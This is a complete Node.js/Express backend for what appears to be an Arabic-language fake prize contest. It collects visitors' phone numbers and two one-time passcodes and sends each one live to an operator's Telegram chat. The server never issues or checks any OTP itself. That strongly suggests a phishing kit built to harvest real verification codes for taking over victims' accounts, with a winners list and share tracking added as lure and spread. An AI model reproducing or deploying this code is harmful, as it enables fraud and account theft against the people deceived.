require('dotenv').config();
const express = require('express');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
const { createClient } = require('@supabase/supabase-js');
const axios = require('axios');
const validator = require('validator');

const app = express();
const PORT = process.env.PORT || 10000;

// Initialize Supabase
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_ANON_KEY
);

// Middleware
app.use(cors({
  origin: process.env.FRONTEND_URL || '*',
  credentials: true
}));
app.use(express.json());

// Rate Limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 requests per window
  message: { success: false, error: 'RATE_LIMIT_EXCEEDED', message: 'تم تجاوز عدد المحاولات المسموحة' }
});

// Telegram Bot Function
const sendToTelegram = async (message) => {
  try {
    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
      console.log('Telegram not configured, skipping...');
      return;
    }
    
    const response = await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      }
    );
    return response.data;
  } catch (error) {
    console.error('Telegram Error:', error.message);
    // Don't stop the process if Telegram fails
  }
};

// Validation Functions
function validatePhone(phone) {
  const phoneRegex = /^[234][0-9]{7}$/;
  return phoneRegex.test(phone);
}

function validateEntryCode(code) {
  if (code.length !== 4) return false;
  const uniqueDigits = new Set(code.split(''));
  return uniqueDigits.size === 4 && /^\d{4}$/.test(code);
}

function validateOTP(code) {
  return /^\d{4}$/.test(code);
}

function sanitizeInput(input) {
  return validator.escape(validator.trim(input));
}

// API Routes

// GET /api/winners
app.get('/api/winners', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('winners')
      .select('*')
      .order('created_at', { ascending: false })
      .limit(100);

    if (error) throw error;

    res.json({
      success: true,
      winners: data || []
    });
  } catch (error) {
    console.error('Error fetching winners:', error);
    res.status(500).json({
      success: false,
      error: 'SERVER_ERROR',
      message: 'حدث خطأ في جلب البيانات'
    });
  }
});

// POST /api/register
app.post('/api/register', limiter, async (req, res) => {
  try {
    const { phone, entryCode } = req.body;

    // Sanitize inputs
    const sanitizedPhone = sanitizeInput(phone);
    const sanitizedEntryCode = sanitizeInput(entryCode);

    // Validate phone
    if (!validatePhone(sanitizedPhone)) {
      return res.status(400).json({
        success: false,
        error: 'INVALID_PHONE',
        message: 'معلومات التسجيل غير صحيحة'
      });
    }

    // Validate entry code
    if (!validateEntryCode(sanitizedEntryCode)) {
      return res.status(400).json({
        success: false,
        error: 'INVALID_CODE',
        message: 'معلومات التسجيل غير صحيحة'
      });
    }

    // Get IP and User Agent
    const ipAddress = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || '';

    // Insert into database
    const { data, error } = await supabase
      .from('participants')
      .insert({
        phone_number: sanitizedPhone,
        entry_code: sanitizedEntryCode,
        ip_address: ipAddress,
        user_agent: userAgent
      })
      .select()
      .single();

    if (error) {
      console.error('Database error:', error);
      return res.status(500).json({
        success: false,
        error: 'DATABASE_ERROR',
        message: 'حدث خطأ في قاعدة البيانات'
      });
    }

    // Send to Telegram
    const telegramMessage = `
🆕 تسجيل جديد
━━━━━━━━━━━━━━
📱 رقم الهاتف: ${sanitizedPhone}
🔐 رمز المشاركة: ${sanitizedEntryCode}
⏰ الوقت: ${new Date().toLocaleString('ar-MR')}
━━━━━━━━━━━━━━
    `;
    await sendToTelegram(telegramMessage);

    res.json({
      success: true,
      message: 'تم التسجيل بنجاح',
      participantId: data.id
    });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({
      success: false,
      error: 'SERVER_ERROR',
      message: 'حدث خطأ في الخادم'
    });
  }
});

// POST /api/verify-otp1
app.post('/api/verify-otp1', limiter, async (req, res) => {
  try {
    const { participantId, phone, entryCode, otp1Code } = req.body;

    // Sanitize inputs
    const sanitizedPhone = sanitizeInput(phone);
    const sanitizedEntryCode = sanitizeInput(entryCode);
    const sanitizedOTP1 = sanitizeInput(otp1Code);

    // Validate OTP format
    if (!validateOTP(sanitizedOTP1)) {
      return res.status(400).json({
        success: false,
        error: 'INVALID_FORMAT',
        message: 'رمز التحقق غير صحيح'
      });
    }

    // Check OTP1 must NOT match Entry Code
    if (sanitizedOTP1 === sanitizedEntryCode) {
      return res.status(400).json({
        success: false,
        error: 'OTP1_MATCHES_ENTRY',
        message: 'رمز التحقق غير صحيح'
      });
    }

    // Verify participant exists
    const { data: participant, error: fetchError } = await supabase
      .from('participants')
      .select('*')
      .eq('id', participantId)
      .eq('phone_number', sanitizedPhone)
      .eq('entry_code', sanitizedEntryCode)
      .single();

    if (fetchError || !participant) {
      return res.status(400).json({
        success: false,
        error: 'PARTICIPANT_NOT_FOUND',
        message: 'رمز التحقق غير صحيح'
      });
    }

    // Update participant with OTP1
    const { error: updateError } = await supabase
      .from('participants')
      .update({ 
        otp1_code: sanitizedOTP1,
        verified: false // Still need OTP2
      })
      .eq('id', participantId);

    if (updateError) {
      console.error('Update error:', updateError);
      return res.status(500).json({
        success: false,
        error: 'DATABASE_ERROR',
        message: 'حدث خطأ في قاعدة البيانات'
      });
    }

    // Send to Telegram - رسالة ثانية عند نجاح OTP1
    const telegramMessage = `
✅ التحقق الأول ناجح
━━━━━━━━━━━━━━
📱 رقم الهاتف: ${sanitizedPhone}
🔐 رمز المشاركة: ${sanitizedEntryCode}
🔢 رمز التحقق الأول (OTP1): ${sanitizedOTP1}
⏰ الوقت: ${new Date().toLocaleString('ar-MR')}
━━━━━━━━━━━━━━
    `;
    await sendToTelegram(telegramMessage);

    res.json({
      success: true,
      message: 'تم التحقق الأول بنجاح'
    });
  } catch (error) {
    console.error('OTP1 verification error:', error);
    res.status(500).json({
      success: false,
      error: 'SERVER_ERROR',
      message: 'حدث خطأ في الخادم'
    });
  }
});

// POST /api/verify-otp2
app.post('/api/verify-otp2', limiter, async (req, res) => {
  try {
    const { participantId, phone, entryCode, otp1Code, otp2Code } = req.body;

    // Sanitize inputs
    const sanitizedPhone = sanitizeInput(phone);
    const sanitizedEntryCode = sanitizeInput(entryCode);
    const sanitizedOTP1 = sanitizeInput(otp1Code);
    const sanitizedOTP2 = sanitizeInput(otp2Code);

    // Validate OTP format
    if (!validateOTP(sanitizedOTP2)) {
      return res.status(400).json({
        success: false,
        error: 'INVALID_FORMAT',
        message: 'رمز التحقق غير صحيح'
      });
    }

    // Check OTP2 must NOT match Entry Code
    if (sanitizedOTP2 === sanitizedEntryCode) {
      return res.status(400).json({
        success: false,
        error: 'OTP2_MATCHES_ENTRY',
        message: 'رمز التحقق غير صحيح'
      });
    }

    // Check OTP2 must NOT match OTP1
    if (sanitizedOTP2 === sanitizedOTP1) {
      return res.status(400).json({
        success: false,
        error: 'OTP2_MATCHES_OTP1',
        message: 'رمز التحقق غير صحيح'
      });
    }

    // Verify participant exists and has OTP1
    const { data: participant, error: fetchError } = await supabase
      .from('participants')
      .select('*')
      .eq('id', participantId)
      .eq('phone_number', sanitizedPhone)
      .eq('entry_code', sanitizedEntryCode)
      .eq('otp1_code', sanitizedOTP1)
      .single();

    if (fetchError || !participant) {
      return res.status(400).json({
        success: false,
        error: 'PARTICIPANT_NOT_FOUND',
        message: 'رمز التحقق غير صحيح'
      });
    }

    // Update participant with OTP2 and mark as verified
    const { error: updateError } = await supabase
      .from('participants')
      .update({ 
        otp2_code: sanitizedOTP2, // Store OTP2
        verified: true
      })
      .eq('id', participantId);

    if (updateError) {
      console.error('Update error:', updateError);
      return res.status(500).json({
        success: false,
        error: 'DATABASE_ERROR',
        message: 'حدث خطأ في قاعدة البيانات'
      });
    }

    // Send to Telegram - رسالة ثالثة عند نجاح OTP2 (تحتوي على OTP1 و OTP2)
    const telegramMessage = `
✅ التحقق النهائي ناجح
━━━━━━━━━━━━━━
📱 رقم الهاتف: ${sanitizedPhone}
🔐 رمز المشاركة: ${sanitizedEntryCode}
🔢 رمز التحقق الأول (OTP1): ${sanitizedOTP1}
🔢 رمز التحقق الثاني (OTP2): ${sanitizedOTP2}
✓ حالة التحقق: مكتمل
⏰ الوقت: ${new Date().toLocaleString('ar-MR')}
━━━━━━━━━━━━━━
    `;
    await sendToTelegram(telegramMessage);

    res.json({
      success: true,
      message: 'تم التحقق النهائي بنجاح'
    });
  } catch (error) {
    console.error('OTP2 verification error:', error);
    res.status(500).json({
      success: false,
      error: 'SERVER_ERROR',
      message: 'حدث خطأ في الخادم'
    });
  }
});

// POST /api/track-share
app.post('/api/track-share', async (req, res) => {
  try {
    const { participantId, platform } = req.body;

    if (!participantId || !platform) {
      return res.status(400).json({
        success: false,
        error: 'MISSING_DATA',
        message: 'بيانات غير مكتملة'
      });
    }

    const { error } = await supabase
      .from('shares')
      .insert({
        participant_id: participantId,
        platform: platform
      });

    if (error) {
      console.error('Share tracking error:', error);
      return res.status(500).json({
        success: false,
        error: 'DATABASE_ERROR',
        message: 'حدث خطأ في قاعدة البيانات'
      });
    }

    res.json({
      success: true,
      message: 'تم تتبع المشاركة'
    });
  } catch (error) {
    console.error('Track share error:', error);
    res.status(500).json({
      success: false,
      error: 'SERVER_ERROR',
      message: 'حدث خطأ في الخادم'
    });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
